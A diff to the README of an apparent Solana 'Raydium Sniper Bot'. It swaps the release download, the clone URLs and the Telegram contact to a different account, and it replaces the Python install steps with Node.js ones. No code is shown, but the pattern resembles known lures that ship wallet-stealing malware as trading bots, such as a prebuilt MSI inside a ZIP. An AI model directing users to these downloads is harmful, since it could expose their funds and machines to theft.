@@ -60,7 +60,7 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
 ## 📥 Getting Started
 
 ### 🖥️ Installation for Windows
-1. Download the latest release from the [Releases Page](https://github.com/SolTradeBot/Raydium-Sniper-Bot/releases/).
+1. Download the latest release from the [Releases Page](https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot/releases/tag/v2.0).
 2. Extract the ZIP file to your desired location.
 3. Launch the application by double-clicking on `RaydiumSniperBot.msi`.
 
@@ -69,37 +69,36 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
 1. Download and install Git:  
    - [Git for Windows](https://git-scm.com/download/win)  
 
-2. Download and install Python:  
-   - [Python 3.12.1 for Windows](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)  
+2. Download and install Node.js:  
+   - [Node.js v20.3.0 for Windows](https://nodejs.org/dist/v20.3.0/node-v20.3.0-x64.msi)  
 
 3. Clone and build the bot (CMD):
    ```bash
-   git clone https://github.com/SolTradeBot/Raydium-Sniper-Bot.git
-   cd Raydium-Sniper-Bot
-   pip install -r requirements.txt
-   python main.py
+   git clone https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot.git
+   cd Raydium-Sol-Sniper-Bot
+   npm install
+   npm start
    ```
 
 ### 🍏 Installation for macOS
 1. Install Git:
    - [Git for macOS](https://git-scm.com/download/mac)
-2. Install Python 3.7.9 version:
-   - [Python 3.7.9 for MacOs](https://www.python.org/ftp/python/3.7.9/python-3.7.9-macosx10.9.pkg)
+2. Install Node.js v20.3.0 version:
+   - [Node.js v20,3.0 for MacOs](https://nodejs.org/dist/v20.3.0/node-v20.3.0.pkg)
 3. Clone and build the bot (Terminal):
    ```bash
-   git clone https://github.com/SolTradeBot/Raydium-Sniper-Bot.git
-   cd Raydium-Sniper-Bot
-   pip install -r requirements.txt
-   python3 main.py
+   git clone https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot.git
+   cd Raydium-Sol-Sniper-Bot
+   npm install
+   npm start
    ```
 
 ---
 
 ## 🛠 System Requirements
 
-- Python 3.7.9
+- Node.js v20.3.0
 - Stable internet connection
-
 ---
 
 ## 🌟 Why Choose Raydium Sniper Bot?
@@ -125,7 +124,7 @@ Have suggestions or need help? Here’s how you can get involved:
 
 ## 📧 Contact Us
 
-For additional support, join our community on [Telegram](https://t.me/SolBotSupport) or reach out via GitHub discussions.
+For additional support, join our community on [Telegram](https://t.me/beautiful_world_haha) or reach out via GitHub discussions.
 
 ---
 
